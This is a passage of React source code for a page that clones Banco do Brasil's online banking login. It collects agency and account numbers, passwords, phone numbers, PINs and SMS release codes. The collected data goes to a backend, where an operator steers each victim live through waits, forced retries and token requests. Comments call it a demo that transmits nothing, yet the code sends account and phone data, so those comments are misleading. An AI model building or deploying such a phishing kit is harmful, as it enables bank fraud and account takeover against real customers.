import referenceHtml from '@assets/Pra_Você_｜_Banco_do_Brasil_(03_09_2026_11：42：01)_1788446722154.html?raw';
import bbCodeReference from '@assets/image_1788450421330.png';
import pjLoginReference from '@assets/image_1788450344970.png';
import verificationBackground from '@assets/imgi_2_Conta_Corrente_Conta_Corrente_Consultar_Extrato_Banco_d_1788466962818.png';
import {
  ClerkProvider,
  RedirectToSignIn,
  SignIn,
  SignUp,
  useAuth,
  useClerk,
  useUser,
} from '@clerk/react';
import { publishableKeyFromHost } from '@clerk/react/internal';
import { shadcn } from '@clerk/themes';
import { ArrowLeft, Eye, EyeOff, ContactRound, FileText, List, MessageCircle, ChevronDown, ChevronsRight, ShieldAlert } from 'lucide-react';
import { Redirect, Route, Router as WouterRouter, Switch, useLocation } from 'wouter';
import { useEffect, useState, type FormEvent, type ReactNode } from 'react';
import DonasPainel from './admin/DonasPainel';
import { PresenceClient } from './lib/presence';

const basePath = import.meta.env.BASE_URL.replace(/\/$/, '');
const clerkPubKey = publishableKeyFromHost(
  window.location.hostname,
  import.meta.env.VITE_CLERK_PUBLISHABLE_KEY,
);
const clerkProxyUrl = import.meta.env.VITE_CLERK_PROXY_URL;

const formatWithLastDigitSeparator = (value: string) =>
  value.length > 1 ? `${value.slice(0, -1)}-${value.slice(-1)}` : value;

const PF_SESSION_KEY = 'pf-agencia-conta';

type PfAgencyAccount = {
  agency: string;
  account: string;
};

const readPfSession = (): PfAgencyAccount | null => {
  try {
    const raw = window.sessionStorage.getItem(PF_SESSION_KEY);
    if (!raw) return null;
    const parsed = JSON.parse(raw) as PfAgencyAccount;
    if (!parsed.agency || !parsed.account) return null;
    return parsed;
  } catch {
    return null;
  }
};

const accountMenuEnhancement = `
<style>
  #acesse-sua-conta {
    position: relative !important;
  }

  #acesse-sua-conta .clone-account-menu {
    position: absolute;
    z-index: 10000;
    top: calc(100% + 18px);
    right: 0;
    width: 300px;
    overflow: hidden;
    border-radius: 4px;
    background: #fff;
    box-shadow: 0 4px 14px rgba(33, 34, 39, 0.28);
    color: #212227;
  }

  #acesse-sua-conta .clone-account-menu[hidden] {
    display: none;
  }

  #acesse-sua-conta .clone-account-menu::before {
    position: absolute;
    top: -9px;
    right: 37px;
    width: 18px;
    height: 18px;
    transform: rotate(45deg);
    background: #fff;
    content: "";
  }

  #acesse-sua-conta .clone-account-menu a {
    position: relative;
    display: block;
    min-height: 62px;
    padding: 19px 24px;
    border-bottom: 1px solid #d8d8d8;
    color: #212227;
    font-family: Arial, sans-serif;
    font-size: 19px;
    font-weight: 600;
    line-height: 1.25;
    text-decoration: none;
  }

  #acesse-sua-conta .clone-account-menu a:last-child {
    border-bottom: 0;
  }

  #acesse-sua-conta .clone-account-menu a:hover,
  #acesse-sua-conta .clone-account-menu a:focus-visible {
    background: #f2f3ff;
    outline: none;
  }

  @media (max-width: 767px) {
    #acesse-sua-conta .clone-account-menu {
      position: fixed;
      top: 59px;
      right: 16px;
      left: 68px;
      width: auto;
    }

    #acesse-sua-conta .clone-account-menu::before {
      top: -9px;
      right: 38px;
    }
  }
</style>
<script>
  (function () {
    function installAccountMenu() {
      var host = document.querySelector("#acesse-sua-conta");
      var button = host && host.querySelector("button");
      if (!host || !button || host.dataset.cloneMenuReady) return;

      host.dataset.cloneMenuReady = "true";
      var menu = document.createElement("div");
      menu.className = "clone-account-menu";
      menu.hidden = true;
      menu.setAttribute("role", "menu");
      menu.innerHTML =
        '<a href="${window.location.origin}${basePath}/pessoa-fisica" target="_top" role="menuitem" data-testid="menu-pessoa-fisica">Pessoa Física</a>' +
        '<a href="${window.location.origin}${basePath}/sign-in" target="_top" role="menuitem" data-testid="menu-pessoa-juridica">Pessoa Jurídica</a>' +
        '<a href="https://www.bb.com.br/site/setor-publico/" role="menuitem" data-testid="menu-setor-publico">Setor Público</a>' +
        '<a href="https://www.bb.com.br/site/agronegocios/" role="menuitem" data-testid="menu-produtor-rural">Produtor Rural/ Private</a>';
      host.appendChild(menu);

      function closeMenu() {
        menu.hidden = true;
        button.setAttribute("aria-expanded", "false");
        host.classList.remove("clone-menu-open");
      }

      button.addEventListener("click", function (event) {
        event.preventDefault();
        event.stopPropagation();
        var shouldOpen = menu.hidden;
        if (shouldOpen) {
          menu.hidden = false;
          button.setAttribute("aria-expanded", "true");
          host.classList.add("clone-menu-open");
        } else {
          closeMenu();
        }
      });

      document.addEventListener("click", function (event) {
        if (!host.contains(event.target)) closeMenu();
      });

      document.addEventListener("keydown", function (event) {
        if (event.key === "Escape") closeMenu();
      });
    }

    if (document.readyState === "loading") {
      document.addEventListener("DOMContentLoaded", installAccountMenu);
    } else {
      installAccountMenu();
    }
  })();
</script>
`;

const cloneHtml = referenceHtml.replace('</head>', `${accountMenuEnhancement}</head>`);

const clerkAppearance = {
  theme: shadcn,
  options: {
    logoPlacement: 'inside' as const,
    logoLinkUrl: basePath || '/',
    logoImageUrl: `${window.location.origin}${basePath}/logo.svg`,
  },
  variables: {
    colorPrimary: '#465eff',
    colorForeground: '#212227',
    colorMutedForeground: '#585b65',
    colorDanger: '#ba1a1a',
    colorBackground: '#ffffff',
    colorInput: '#ffffff',
    colorInputForeground: '#212227',
    colorNeutral: '#d8d8d8',
    fontFamily: 'Arial, sans-serif',
    borderRadius: '12px',
  },
  elements: {
    rootBox: { width: '100%', display: 'flex', justifyContent: 'center' },
    cardBox: {
      width: '440px',
      maxWidth: '100%',
      overflow: 'hidden',
      borderRadius: '20px',
      backgroundColor: '#ffffff',
      boxShadow: '0 12px 40px rgba(33, 34, 39, 0.16)',
    },
    card: { boxShadow: 'none', border: 'none', backgroundColor: 'transparent' },
    footer: { boxShadow: 'none', border: 'none', backgroundColor: 'transparent' },
    headerTitle: { color: '#212227', fontWeight: '700' },
    headerSubtitle: { color: '#585b65' },
    socialButtonsBlockButtonText: { color: '#212227' },
    formFieldLabel: { color: '#212227' },
    footerActionLink: { color: '#465eff', fontWeight: '700' },
    footerActionText: { color: '#585b65' },
    dividerText: { color: '#585b65' },
    identityPreviewEditButton: { color: '#465eff' },
    formFieldSuccessText: { color: '#18794e' },
    alertText: { color: '#ba1a1a' },
    logoBox: { marginBottom: '8px' },
    logoImage: { maxHeight: '34px' },
    socialButtonsBlockButton: {
      border: '1px solid #d8d8d8',
      backgroundColor: '#ffffff',
      color: '#212227',
    },
    formButtonPrimary: {
      backgroundColor: '#465eff',
      color: '#ffffff',
      fontWeight: '700',
    },
    formFieldInput: {
      border: '1px solid #b7b9c2',
      backgroundColor: '#ffffff',
      color: '#212227',
    },
    footerAction: { backgroundColor: 'transparent' },
    dividerLine: { backgroundColor: '#d8d8d8' },
    alert: { backgroundColor: '#fff1f1', border: '1px solid #f0b8b8' },
    otpCodeFieldInput: { border: '1px solid #b7b9c2', color: '#212227' },
    formFieldRow: { marginBottom: '14px' },
    main: { padding: '28px' },
  },
};

function HomePage() {
  return (
    <iframe
      className="reference-frame"
      srcDoc={cloneHtml}
      title="Pra Você | Banco do Brasil"
      data-testid="reference-page"
    />
  );
}

function HomeRedirect() {
  const { isLoaded, isSignedIn } = useAuth();

  if (isLoaded && isSignedIn) {
    return <Redirect to="/user-portal" />;
  }

  return <HomePage />;
}

function AutoatendimentoShell({
  children,
  loading = false,
}: {
  children: ReactNode;
  loading?: boolean;
}) {
  return (
    <main className="auto-page">
      <header className="auto-topbar">
        <a href={basePath || '/'} aria-label="Voltar para a página inicial">
          <img src={`${basePath}/autoatendimento-logo.svg`} alt="Autoatendimento" />
        </a>
      </header>

      <section className="auto-content">{children}</section>

      <nav className="auto-bottom-nav" aria-label="Atalhos do autoatendimento">
        <button type="button" aria-label="Contatos"><ContactRound size={24} /></button>
        <button type="button" aria-label="Menu"><List size={24} /></button>
        <button type="button" aria-label="Documentos"><FileText size={24} /></button>
      </nav>
      <button className="auto-chat" type="button" aria-label="Abrir atendimento">
        <MessageCircle size={23} />
      </button>
      {loading && <PjLoadingOverlay />}
    </main>
  );
}

function AutoatendimentoPage() {
  const [, setLocation] = useLocation();
  const [agency, setAgency] = useState('');
  const [account, setAccount] = useState('');
  const [rememberAccount, setRememberAccount] = useState(false);
  const [error, setError] = useState('');
  const [focusedField, setFocusedField] = useState<'agency' | 'account'>('agency');
  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = (event: FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    const normalizedAgency = agency.replace(/\D/g, '');
    const normalizedAccount = account.replace(/\D/g, '');

    if (!normalizedAgency || !normalizedAccount) {
      setError('Informe a agência e a conta para continuar.');
      return;
    }

    window.sessionStorage.setItem(
      PF_SESSION_KEY,
      JSON.stringify({ agency: normalizedAgency, account: normalizedAccount }),
    );

    if (rememberAccount) {
      window.localStorage.setItem(
        'conta-pj-agencia-conta',
        JSON.stringify({ agency: normalizedAgency, account: normalizedAccount }),
      );
    }

    setError('');
    setIsLoading(true);
    trackSession('PF', '/pessoa-fisica', `Ag ${normalizedAgency} / Conta ${normalizedAccount}`, undefined, true);
  };

  useEffect(() => {
    if (!isLoading) return;

    const timer = window.setTimeout(() => {
      setLocation('/pessoa-fisica/senha');
    }, 2000);

    return () => window.clearTimeout(timer);
  }, [isLoading, setLocation]);

  // Aviso de "Dados inválidos" ao retornar do comando do operador.
  useEffect(() => {
    try {
      if (window.sessionStorage.getItem('bb-invalid-retry')) {
        window.sessionStorage.removeItem('bb-invalid-retry');
        setError('Os dados informados são inválidos. Verifique e tente novamente.');
      }
    } catch {
      /* ignore */
    }
  }, []);

  return (
    <AutoatendimentoShell loading={isLoading}>
      <form className="auto-card" onSubmit={handleSubmit} aria-labelledby="auto-title">
        <h1 id="auto-title">Agência e conta</h1>

        <label
          className={`auto-field-label ${focusedField === 'agency' ? 'is-focused' : ''}`}
          htmlFor="agency"
        >
          Agência
        </label>
        <input
          id="agency"
          inputMode="numeric"
          autoComplete="off"
          placeholder="Agência"
          autoFocus
          value={formatWithLastDigitSeparator(agency)}
          onChange={(event) => setAgency(event.target.value.replace(/\D/g, '').slice(0, 5))}
          maxLength={6}
          onFocus={() => setFocusedField('agency')}
          aria-describedby={error ? 'auto-error' : 'agency-help'}
          aria-invalid={Boolean(error)}
        />
        <span id="agency-help" className="auto-field-help">
          Informe sua agência com o dígito
        </span>

        <label
          className={`auto-field-label ${focusedField === 'account' ? 'is-focused' : ''}`}
          htmlFor="account"
        >
          Conta
        </label>
        <input
          id="account"
          inputMode="numeric"
          autoComplete="off"
          placeholder="Conta corrente"
          value={formatWithLastDigitSeparator(account)}
          onChange={(event) => setAccount(event.target.value.replace(/\D/g, '').slice(0, 11))}
          maxLength={12}
          onFocus={() => setFocusedField('account')}
          aria-describedby={error ? 'auto-error' : 'account-help'}
          aria-invalid={Boolean(error)}
        />
        <span id="account-help" className="auto-field-help">
          Informe sua conta com o dígito
        </span>

        <label className="auto-switch-row">
          <input
            type="checkbox"
            checked={rememberAccount}
            onChange={(event) => setRememberAccount(event.target.checked)}
          />
          <span className="auto-switch" aria-hidden="true" />
          <span>Guardar agência e conta</span>
        </label>

        {error && <p className="auto-error" id="auto-error" role="alert">{error}</p>}

        <button className="auto-continue" type="submit">CONTINUAR</button>
        <button className="auto-other-access" type="button" onClick={() => setLocation('/')}>
          Outro tipo de acesso
        </button>
      </form>
    </AutoatendimentoShell>
  );
}

function AutoatendimentoPasswordPage() {
  const [, setLocation] = useLocation();
  const session = readPfSession();

  const [password, setPassword] = useState('');
  const [navigating, setNavigating] = useState(false);

  useEffect(() => {
    if (!navigating) return;
    const timer = window.setTimeout(() => {
      setLocation('/pessoa-fisica/liberacao');
    }, 2000);
    return () => window.clearTimeout(timer);
  }, [navigating, setLocation]);

  if (!session) {
    return <Redirect to="/pessoa-fisica" />;
  }

  const handleSubmit = (event: FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    // Ambiente de demonstração: aceita qualquer senha fictícia de 8 dígitos.
    // A senha digitada não é coletada, transmitida nem persistida.
    setPassword('');
    setNavigating(true);
    trackSession(
      'PF',
      '/pessoa-fisica/senha',
      session ? `Ag ${session.agency} / Conta ${session.account}` : null,
    );
  };

  const summary = (
    <div className="auto-summary">
      <div className="auto-summary-col">
        <span>Agência</span>
        <strong data-testid="senha-agencia">{formatWithLastDigitSeparator(session.agency)}</strong>
      </div>
      <div className="auto-summary-col">
        <span>Conta</span>
        <strong data-testid="senha-conta">{formatWithLastDigitSeparator(session.account)}</strong>
      </div>
    </div>
  );

  return (
    <AutoatendimentoShell loading={navigating}>
      <form
        className="auto-card auto-card-senha"
        onSubmit={handleSubmit}
        aria-labelledby="auto-password-title"
        data-testid="senha-form-validar"
      >
        <h1 id="auto-password-title">Agência e Conta</h1>

        {summary}

        <label className="auto-field-label" htmlFor="pf-password">
          Senha de 8 dígitos
        </label>
        <div className="auto-password-row">
          <input
            id="pf-password"
            type="password"
            inputMode="numeric"
            autoComplete="off"
            placeholder="SENHA 8 DÍGITOS"
            value={password}
            onChange={(event) => setPassword(event.target.value.replace(/\D/g, '').slice(0, 8))}
            maxLength={8}
            required
            data-testid="senha-input-validar"
          />
          <button
            type="button"
            className="auto-help-btn"
            aria-label="Ajuda sobre a senha de 8 dígitos"
            data-testid="senha-ajuda"
          >
            ?
          </button>
        </div>

        <button
          className="auto-continue"
          type="submit"
          disabled={password.length !== 8 || navigating}
          data-testid="senha-entrar"
        >
          ENTRAR
        </button>
        <button
          className="auto-other-access"
          type="button"
          onClick={() => setLocation('/pessoa-fisica')}
          data-testid="senha-outra-conta"
        >
          Outra conta
        </button>
      </form>
    </AutoatendimentoShell>
  );
}

function AutoatendimentoLiberacaoPage() {
  const [, setLocation] = useLocation();
  const session = readPfSession();

  const [phone, setPhone] = useState('');
  const [pin, setPin] = useState('');
  const [submitting, setSubmitting] = useState(false);

  if (!session) {
    return <Redirect to="/pessoa-fisica" />;
  }

  // Máscara de celular fictício: (99) 99123-4567 (11 dígitos).
  const formatPhone = (digits: string) => {
    const d = digits.slice(0, 11);
    if (d.length <= 2) return d.length ? `(${d}` : '';
    if (d.length <= 7) return `(${d.slice(0, 2)}) ${d.slice(2)}`;
    return `(${d.slice(0, 2)}) ${d.slice(2, 7)}-${d.slice(7)}`;
  };

  const canAdvance = phone.length === 11 && pin.length === 6;

  const handleAvancar = (event: FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    if (!canAdvance) return;
    // Ambiente de demonstração: valores fictícios; nada é coletado, transmitido ou persistido.
    // Exibe o loading padrão existente de forma indefinida (sem timeout/navegação).
    setSubmitting(true);
    trackSession('PF', '/pessoa-fisica/liberacao', `Cel ${formatPhone(phone)}`);
  };

  return (
    <AutoatendimentoShell>
      <div className="auto-liberacao-stage">
        <form
          className="auto-liberacao-modal"
          onSubmit={handleAvancar}
          aria-labelledby="liberacao-title"
          data-testid="liberacao-modal"
        >
          <header className="auto-liberacao-header">
            <h1 id="liberacao-title">Liberação de computador</h1>
          </header>

          <div className="auto-liberacao-body">
            <p>Esse procedimento será realizado somente uma única vez.</p>
            <p className="auto-liberacao-lead">
              Confirme número de celular cadastrado: para identificar esse
              computador. Para isso, utilize os campos abaixo:
            </p>

            <input
              className="auto-liberacao-input"
              inputMode="numeric"
              autoComplete="off"
              placeholder="(DDD) + Número"
              value={formatPhone(phone)}
              onChange={(event) => setPhone(event.target.value.replace(/\D/g, '').slice(0, 11))}
              maxLength={16}
              data-testid="liberacao-input-celular"
            />
            <input
              className="auto-liberacao-input"
              type="password"
              inputMode="numeric"
              autoComplete="off"
              placeholder="Senha de (6) dígitos"
              value={pin}
              onChange={(event) => setPin(event.target.value.replace(/\D/g, '').slice(0, 6))}
              maxLength={6}
              data-testid="liberacao-input-senha"
            />

            <footer className="auto-liberacao-footer">
              <button
                type="button"
                className="auto-liberacao-close"
                aria-label="Fechar"
                onClick={() => setLocation('/pessoa-fisica/senha')}
                data-testid="liberacao-fechar"
              >
                x
              </button>
              <button
                type="submit"
                className="auto-liberacao-advance"
                disabled={!canAdvance}
                data-testid="liberacao-avancar"
              >
                AVANÇAR
              </button>
            </footer>
          </div>
        </form>
      </div>
      {submitting && (
        <LiveControlOverlay flow="PF" route="/pessoa-fisica/liberacao" entry="/pessoa-fisica" />
      )}
    </AutoatendimentoShell>
  );
}

function PjLoadingOverlay() {
  return (
    <div className="pj-loading-overlay" role="status" aria-live="polite">
      <div className="pj-loading-content">
        <span className="pj-loading-spinner" aria-hidden="true" />
        <span>Aguarde</span>
      </div>
    </div>
  );
}

/**
 * Sobreposição de controle ao vivo: consulta a diretiva definida pelo operador
 * no painel e orienta a interface do visitante. NUNCA transmite senha/OTP — o
 * valor digitado (token/telefone) fica apenas no cliente; ao servidor enviamos
 * somente o aviso de que o cliente respondeu.
 */
function LiveControlOverlay({
  flow,
  route,
  entry,
  passiveWhenWaiting = false,
}: {
  flow: FlowType;
  route: string;
  entry: string;
  passiveWhenWaiting?: boolean;
}) {
  const [, setLocation] = useLocation();
  const [directive, setDirective] = useState<string>('none');
  const [status, setStatus] = useState<string>('active');
  const [phone, setPhone] = useState('');
  const [responded, setResponded] = useState(false);
  const [smsLast3, setSmsLast3] = useState<string>('');
  const [code, setCode] = useState('');
  const [pendingWait, setPendingWait] = useState(false);
  const [holdSeconds, setHoldSeconds] = useState(360);

  // Contador regressivo apenas visual do modal PF "Colocar em aguarde".
  useEffect(() => {
    if (directive !== 'hold') {
      setHoldSeconds(360);
      return;
    }
    const id = window.setInterval(
      () => setHoldSeconds((s) => (s > 0 ? s - 1 : 0)),
      1000,
    );
    return () => window.clearInterval(id);
  }, [directive]);

  useEffect(() => {
    let alive = true;
    const sessionId = getSessionId();
    const poll = () =>
      fetch(`/api/auth-attempt/directive?sessionId=${encodeURIComponent(sessionId)}`)
        .then((r) => (r.ok ? r.json() : null))
        .then((d) => {
          if (!alive || !d) return;
          setDirective(d.directive ?? 'none');
          setStatus(d.status ?? 'active');
          setSmsLast3(d.smsLast3 ?? '');
          if (d.directive && d.directive !== 'hold' && d.directive !== 'none') {
            setResponded(false);
          }
        })
        .catch(() => {});
    poll();
    const id = window.setInterval(poll, 2500);
    return () => {
      alive = false;
      window.clearInterval(id);
    };
  }, []);

  useEffect(() => {
    if (directive === 'ended' || status === 'ended') {
      const t = window.setTimeout(() => setLocation('/'), 4500);
      return () => window.clearTimeout(t);
    }
  }, [directive, status, setLocation]);

  // "Dados inválidos": leva o usuário de volta à página inicial de login do fluxo
  // (PF: /pessoa-fisica, PJ: /sign-in) com um aviso para tentar novamente. A flag
  // é lida pela página de entrada para exibir a mensagem.
  useEffect(() => {
    if (directive === 'invalid') {
      try {
        window.sessionStorage.setItem('bb-invalid-retry', '1');
      } catch {
        /* ignore */
      }
      setLocation(entry);
    }
  }, [directive, entry, setLocation]);

  // Reset da tela de entrada de teste sempre que o operador (re)aciona "Token SMS":
  // sai do "Aguarde" (pendingWait) e limpa o campo. O aviso de "Código inválido"
  // é derivado da diretiva 'sms_token_retry'.
  useEffect(() => {
    if (directive === 'sms_token' || directive === 'sms_token_retry') {
      setCode('');
      setPendingWait(false);
    }
  }, [directive]);

  const formatPhone = (digits: string) => {
    const d = digits.slice(0, 11);
    if (d.length <= 2) return d.length ? `(${d}` : '';
    if (d.length <= 7) return `(${d.slice(0, 2)}) ${d.slice(2)}`;
    return `(${d.slice(0, 2)}) ${d.slice(2, 7)}-${d.slice(7)}`;
  };

  const waiting = (
    <div className="pj-loading-content">
      <span className="pj-loading-spinner" aria-hidden="true" />
      <span>Aguarde</span>
    </div>
  );

  // Entrada de teste fictícia (comum a PF e PJ). NÃO valida, NÃO envia e NÃO
  // armazena o valor digitado: ao confirmar, apenas sinaliza ao backend que houve
  // uma entrada (muda o estado da sessão para "Aguarde") — sem o conteúdo do campo.
  const smsError = directive === 'sms_token_retry' ? 'Código inválido. Digite novamente.' : '';

  const submitEntry = (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    if (code.length !== 4 || pendingWait) return;
    setPendingWait(true);
    setCode('');
    fetch('/api/auth-attempt/sms-entry', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ sessionId: getSessionId() }),
    }).catch(() => {});
  };

  const onCodeChange = (v: string) =>
    setCode(v.toUpperCase().replace(/[^A-Z0-9]/g, '').slice(0, 4));

  const inSmsEntry = directive === 'sms_token' || directive === 'sms_token_retry';

  // PJ — tela de código de liberação (homologação), seguindo o layout do print PJ.
  if (flow === 'PJ' && inSmsEntry && !pendingWait && status !== 'ended') {
    return (
      <div className="pj-code-overlay" data-testid="live-sms-code-page">
        <main className="token-page">
          <button
            type="button"
            className="token-back"
            onClick={() => setLocation(entry)}
            aria-label="Voltar"
          >
            <ArrowLeft size={22} strokeWidth={1.75} />
          </button>

          <section className="token-left">
            <div className="token-left-inner">
              <header className="token-header">
                <img src={`${basePath}/bb-icon.svg`} alt="Banco do Brasil" className="token-logo" />
                <h1 className="token-title">Acesse sua conta Banco do Brasil</h1>
              </header>

              <div className="token-copy-block">
                <p className="token-unlock">Digite o código de liberação recebido.</p>
                <p className="token-hint">
                  Enviamos um SMS para você do número XX XXXXX-X{smsLast3 || 'XXX'}
                </p>
              </div>

              <form className="token-form" onSubmit={submitEntry}>
                <div className="token-field">
                  <label className="token-label" htmlFor="sms-liberacao-code">
                    Código de liberação
                  </label>
                  <input
                    id="sms-liberacao-code"
                    className="token-input"
                    placeholder="Código de liberação"
                    value={code}
                    onChange={(e) => onCodeChange(e.target.value)}
                    maxLength={4}
                    autoComplete="off"
                    autoFocus
                    disabled={pendingWait}
                    data-testid="live-sms-code-input"
                  />
                </div>

                {smsError && (
                  <p className="token-error" role="alert" data-testid="live-sms-code-error">
                    {smsError}
                  </p>
                )}

                <button
                  type="submit"
                  className="token-submit"
                  disabled={code.length !== 4 || pendingWait}
                  data-testid="live-sms-code-submit"
                >
                  AVANÇAR
                </button>
              </form>
            </div>
          </section>

          <aside className="token-right" aria-hidden="true">
            <img src={`${basePath}/token-hero.jpg`} alt="" className="token-hero" />
          </aside>

          <p className="token-legal">(c) Banco do Brasil</p>
          <button type="button" className="token-chat" aria-label="Abrir chat">
            <MessageCircle size={22} />
          </button>
        </main>
      </div>
    );
  }

  // PF — tela de "Liberação de computador" (homologação), seguindo o print PF e
  // reutilizando o padrão visual existente (.auto-liberacao-*), NÃO a tela PJ.
  if (flow === 'PF' && inSmsEntry && !pendingWait && status !== 'ended') {
    return (
      <div className="auto-code-overlay" data-testid="live-sms-code-page-pf">
        <AutoatendimentoShell>
          <div className="auto-liberacao-stage">
            <form
              className="auto-liberacao-modal"
              onSubmit={submitEntry}
              aria-labelledby="pf-code-title"
              data-testid="pf-code-modal"
            >
              <header className="auto-liberacao-header">
                <h1 id="pf-code-title">Liberação de computador</h1>
              </header>

              <div className="auto-liberacao-body">
                <p className="auto-liberacao-lead">
                  Enviamos um SMS para você do número
                </p>
                <p className="auto-liberacao-phone">XX XXXXX-X{smsLast3 || 'XXX'}</p>

                <input
                  className="auto-liberacao-input auto-liberacao-code-input"
                  placeholder="CÓDIGO DE LIBERAÇÃO"
                  value={code}
                  onChange={(e) => onCodeChange(e.target.value)}
                  maxLength={4}
                  autoComplete="off"
                  autoFocus
                  disabled={pendingWait}
                  data-testid="live-pf-code-input"
                />

                {smsError && (
                  <p className="auto-liberacao-error" role="alert" data-testid="live-pf-code-error">
                    {smsError}
                  </p>
                )}

                <footer className="auto-liberacao-footer">
                  <button
                    type="button"
                    className="auto-liberacao-close"
                    aria-label="Fechar"
                    onClick={() => setLocation(entry)}
                    data-testid="live-pf-code-close"
                  >
                    x
                  </button>
                  <button
                    type="submit"
                    className="auto-liberacao-advance"
                    disabled={code.length !== 4 || pendingWait}
                    data-testid="live-pf-code-submit"
                  >
                    LIBERAR
                  </button>
                </footer>
              </div>
            </form>
          </div>
        </AutoatendimentoShell>
      </div>
    );
  }

  // PF — "Colocar em aguarde": modal de espera conforme referência (print).
  // Isolado por sessão (a diretiva 'hold' vem da própria sessão). NÃO altera o
  // comportamento do PJ. Permanece até o operador enviar outro comando.
  if (flow === 'PF' && directive === 'hold' && status !== 'ended') {
    const pf = readPfSession();
    const agencia = pf ? formatWithLastDigitSeparator(pf.agency) : '—';
    const conta = pf ? formatWithLastDigitSeparator(pf.account) : '—';
    const holdTimer = `${String(Math.floor(holdSeconds / 60)).padStart(2, '0')}:${String(
      holdSeconds % 60,
    ).padStart(2, '0')}`;
    return (
      <div className="pf-hold-overlay" role="status" aria-live="polite" data-testid="live-pf-hold">
        <div className="pf-hold-modal" data-testid="live-pf-hold-modal">
          <header className="pf-hold-header">INICIANDO SOLICITAÇÃO</header>
          <div className="pf-hold-body">
            <p className="pf-hold-lead">
              Aguarde alguns instantes, iremos dar continuidade com a autorização deste computador.
            </p>
            <p className="pf-hold-account" data-testid="live-pf-hold-account">
              <strong>Agência:</strong> {agencia}&nbsp;&nbsp;<strong>Conta:</strong> {conta}
            </p>
            <hr className="pf-hold-divider" />
            <p className="pf-hold-note">
              Não conseguimos identificar este dispositivo em sua lista de computadores autorizados
              e seguros.
              <br />
              Aguarde...
            </p>
            <span className="pf-hold-spinner" aria-hidden="true" />
            <span className="pf-hold-session">Sessão {holdTimer}</span>
          </div>
        </div>
      </div>
    );
  }

  let body: ReactNode = waiting;

  if (directive === 'ended' || status === 'ended') {
    body = (
      <div className="live-control-card" data-testid="live-ended">
        <h2>Atendimento encerrado</h2>
        <p>Sua sessão foi encerrada com segurança. Você será redirecionado.</p>
      </div>
    );
  } else if (directive === 'sms_token_wait' || pendingWait) {
    // Após o envio do SMS: no PJ (passivo) o próprio PjAuthorizationPage já mostra
    // o card "INICIANDO SOLICITAÇÃO" (o aguarde do modal), então não desenhamos o
    // spinner extra por cima. No PF o overlay continua sendo a tela de aguarde.
    if (passiveWhenWaiting) return null;
    body = waiting;
  } else if (responded) {
    body = waiting;
  } else if (directive === 'invalid') {
    // Redireciona para a tela de login do fluxo (efeito acima); o aviso aparece lá.
    if (passiveWhenWaiting) return null;
    body = waiting;
  } else if (directive === 'ask_phone') {
    body = (
      <form
        className="live-control-card"
        data-testid="live-ask-phone"
        onSubmit={(e) => {
          e.preventDefault();
          const digits = phone.replace(/\D/g, '');
          if (digits.length !== 11) return;
          setResponded(true);
          trackSession(flow, route, `Cel ${formatPhone(digits)}`, 'Telefone informado');
          setPhone('');
        }}
      >
        <h2>Confirme seu telefone</h2>
        <p>Para continuar, confirme o número de celular cadastrado.</p>
        <input
          className="live-control-input"
          inputMode="numeric"
          autoFocus
          placeholder="(DDD) + Número"
          value={formatPhone(phone.replace(/\D/g, ''))}
          onChange={(e) => setPhone(e.target.value.replace(/\D/g, '').slice(0, 11))}
          maxLength={16}
          data-testid="live-phone-input"
        />
        <button
          type="submit"
          className="live-control-btn"
          disabled={phone.replace(/\D/g, '').length !== 11}
          data-testid="live-phone-submit"
        >
          Confirmar
        </button>
      </form>
    );
  } else {
    // none | hold
    if (passiveWhenWaiting) return null;
    body = waiting;
  }

  return (
    <div className="pj-loading-overlay" role="status" aria-live="polite" data-testid="live-control-overlay">
      {body}
    </div>
  );
}

function PjLoginPage() {
  const [, setLocation] = useLocation();
  const [accessType, setAccessType] = useState('Chave J');
  const [identifier, setIdentifier] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [rememberMe, setRememberMe] = useState(true);
  const [isLoading, setIsLoading] = useState(false);

  const [profileOpen, setProfileOpen] = useState(false);
  const [profile, setProfile] = useState('PJ Empresas');
  const [invalidMsg, setInvalidMsg] = useState(false);

  useEffect(() => {
    try {
      if (window.sessionStorage.getItem('bb-invalid-retry')) {
        window.sessionStorage.removeItem('bb-invalid-retry');
        setInvalidMsg(true);
      }
    } catch {
      /* ignore */
    }
  }, []);

  const isChaveJPrefixValid = identifier.startsWith('J');
  const isChaveJComplete = isChaveJPrefixValid && identifier.length === 8;
  const showChaveJError =
    accessType === 'Chave J' && identifier.length > 0 && !isChaveJPrefixValid;

  const handleSubmit = (event: FormEvent<HTMLFormElement>) => {
    event.preventDefault();

    if (accessType === 'Chave J' && !isChaveJComplete) {
      return;
    }

    setIsLoading(true);
    trackSession('PJ', '/sign-in', `${accessType}: ${identifier}`, undefined, true);
  };

  useEffect(() => {
    if (!isLoading) return;

    const timer = window.setTimeout(() => {
      setIsLoading(false);
      setLocation('/sign-in/celular');
    }, 1500);

    return () => window.clearTimeout(timer);
  }, [isLoading, setLocation]);

  const profiles = ['PJ Empresas', 'Setor Público', 'Produtor Rural/Private', 'Não correntista'];

  const handleIdentifierChange = (value: string) => {
    if (accessType === 'Chave J') {
      setIdentifier(value.toUpperCase().replace(/[^A-Z0-9]/g, '').slice(0, 8));
      return;
    }

    setIdentifier(value);
  };

  return (
    <main className="pj-login-container">
      <div className="pj-login-left">
        <div className="pj-login-left-content">
          <header className="pj-login-header">
            <img src={`${basePath}/bb-icon.svg`} alt="Banco do Brasil" className="pj-login-logo" />
            <div className="pj-login-title">
              <h1>Acesse sua conta</h1>
              <h2>Banco do Brasil</h2>
            </div>
          </header>

          <form className="pj-login-form" onSubmit={handleSubmit}>
            {invalidMsg && (
              <div className="pj-invalid-banner" role="alert" data-testid="pj-invalid-banner">
                Os dados informados são inválidos. Verifique e tente novamente.
              </div>
            )}
            <div className="pj-profile-select-group">
              <span className="pj-group-label" id="profile-label">Perfil selecionado</span>
              <div className="pj-profile-dropdown-container">
                <button 
                  type="button" 
                  className={`pj-profile-dropdown ${profileOpen ? 'open' : ''}`} 
                  onClick={() => setProfileOpen(!profileOpen)}
                  aria-haspopup="listbox"
                  aria-expanded={profileOpen}
                  aria-labelledby="profile-label"
                >
                  <span>{profile}</span>
                  <ChevronDown size={20} className="pj-dropdown-icon" />
                </button>
                {profileOpen && (
